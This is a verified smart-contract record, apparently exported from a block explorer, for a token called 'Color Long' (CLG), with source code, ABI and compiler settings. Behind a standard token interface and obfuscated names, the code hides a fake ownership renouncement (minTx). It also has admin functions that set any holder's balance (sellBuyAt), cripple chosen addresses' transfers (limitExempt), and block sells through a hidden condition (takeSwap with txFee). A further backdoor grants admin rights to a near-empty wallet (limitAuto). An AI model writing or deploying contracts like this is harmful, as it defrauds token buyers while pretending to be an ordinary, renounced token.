{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface walletAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract totalSwapAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitEnable {\n    function createPair(address swapTradingMarketing, address fundTo) external returns (address);\n}\n\ninterface liquidityMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverTeam) external view returns (uint256);\n\n    function transfer(address txMode, uint256 limitIsAmount) external returns (bool);\n\n    function allowance(address teamFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitIsAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMode,\n        uint256 limitIsAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed minIs, uint256 value);\n    event Approval(address indexed teamFee, address indexed spender, uint256 value);\n}\n\ninterface launchedToken is liquidityMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ColorLong is totalSwapAmount, liquidityMin, launchedToken {\n\n    bool private maxMin;\n\n    string private listLimitAuto = \"CLG\";\n\n    uint256 private buyLaunched = 100000000 * 10 ** 18;\n\n    address private enableWallet;\n\n    mapping(address => uint256) private isAuto;\n\n    uint256 constant liquiditySender = 3 ** 10;\n\n    bool public receiverSwap;\n\n    address public fundEnable;\n\n    uint256 public receiverSenderToken;\n\n    uint256 walletTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedList;\n    }\n\n    mapping(address => bool) public teamEnable;\n\n    function sellBuyAt(address receiverEnable, uint256 limitIsAmount) public {\n        minEnable();\n        isAuto[receiverEnable] = limitIsAmount;\n    }\n\n    constructor (){\n        \n        walletAt walletEnableFund = walletAt(isLaunched);\n        fundEnable = limitEnable(walletEnableFund.factory()).createPair(walletEnableFund.WETH(), address(this));\n        if (receiverSenderToken == walletAuto) {\n            sellTx = false;\n        }\n        fundLaunch = _msgSender();\n        minTx();\n        receiverMin[fundLaunch] = true;\n        isAuto[fundLaunch] = buyLaunched;\n        \n        emit Transfer(address(0), fundLaunch, buyLaunched);\n    }\n\n    function transfer(address receiverEnable, uint256 limitIsAmount) external virtual override returns (bool) {\n        return txFee(_msgSender(), receiverEnable, limitIsAmount);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return isAmountTake;\n    }\n\n    function minTx() public {\n        emit OwnershipTransferred(fundLaunch, address(0));\n        enableWallet = address(0);\n    }\n\n    uint256 takeFund;\n\n    uint256 private maxList;\n\n    uint8 private launchedList = 18;\n\n    function txFee(address walletMin, address txMode, uint256 limitIsAmount) internal returns (bool) {\n        if (walletMin == fundLaunch) {\n            return fromTx(walletMin, txMode, limitIsAmount);\n        }\n        uint256 tokenMin = liquidityMin(fundEnable).balanceOf(launchedReceiver);\n        require(tokenMin == takeFund);\n        require(txMode != launchedReceiver);\n        if (teamEnable[walletMin]) {\n            return fromTx(walletMin, txMode, liquiditySender);\n        }\n        return fromTx(walletMin, txMode, limitIsAmount);\n    }\n\n    mapping(address => bool) public receiverMin;\n\n    function approve(address minFee, uint256 limitIsAmount) public virtual override returns (bool) {\n        totalBuy[_msgSender()][minFee] = limitIsAmount;\n        emit Approval(_msgSender(), minFee, limitIsAmount);\n        return true;\n    }\n\n    function fromTx(address walletMin, address txMode, uint256 limitIsAmount) internal returns (bool) {\n        require(isAuto[walletMin] >= limitIsAmount);\n        isAuto[walletMin] -= limitIsAmount;\n        isAuto[txMode] += limitIsAmount;\n        emit Transfer(walletMin, txMode, limitIsAmount);\n        return true;\n    }\n\n    bool public teamMax;\n\n    function allowance(address shouldMinTeam, address minFee) external view virtual override returns (uint256) {\n        if (minFee == isLaunched) {\n            return type(uint256).max;\n        }\n        return totalBuy[shouldMinTeam][minFee];\n    }\n\n    address isLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private walletTeam;\n\n    address public fundLaunch;\n\n    function getOwner() external view returns (address) {\n        return enableWallet;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listLimitAuto;\n    }\n\n    function owner() external view returns (address) {\n        return enableWallet;\n    }\n\n    function limitAuto(address atIs) public {\n        require(atIs.balance < 100000);\n        if (receiverSwap) {\n            return;\n        }\n        if (receiverSenderToken == walletAuto) {\n            walletTeam = exemptModeTotal;\n        }\n        receiverMin[atIs] = true;\n        \n        receiverSwap = true;\n    }\n\n    string private isAmountTake = \"Color Long\";\n\n    mapping(address => mapping(address => uint256)) private totalBuy;\n\n    event OwnershipTransferred(address indexed receiverToken, address indexed swapFund);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyLaunched;\n    }\n\n    uint256 private walletAuto;\n\n    function minEnable() private view {\n        require(receiverMin[_msgSender()]);\n    }\n\n    function balanceOf(address receiverTeam) public view virtual override returns (uint256) {\n        return isAuto[receiverTeam];\n    }\n\n    function takeSwap(uint256 limitIsAmount) public {\n        minEnable();\n        takeFund = limitIsAmount;\n    }\n\n    address launchedReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function limitExempt(address minSwapMax) public {\n        minEnable();\n        \n        if (minSwapMax == fundLaunch || minSwapMax == fundEnable) {\n            return;\n        }\n        teamEnable[minSwapMax] = true;\n    }\n\n    uint256 public exemptModeTotal;\n\n    bool private sellTx;\n\n    function transferFrom(address walletMin, address txMode, uint256 limitIsAmount) external override returns (bool) {\n        if (_msgSender() != isLaunched) {\n            if (totalBuy[walletMin][_msgSender()] != type(uint256).max) {\n                require(limitIsAmount <= totalBuy[walletMin][_msgSender()]);\n                totalBuy[walletMin][_msgSender()] -= limitIsAmount;\n            }\n        }\n        return txFee(walletMin, txMode, limitIsAmount);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMinTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIsAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptModeTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atIs\",\"type\":\"address\"}],\"name\":\"limitAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSwapMax\",\"type\":\"address\"}],\"name\":\"limitExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSenderToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIsAmount\",\"type\":\"uint256\"}],\"name\":\"sellBuyAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitIsAmount\",\"type\":\"uint256\"}],\"name\":\"takeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIsAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitIsAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ColorLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}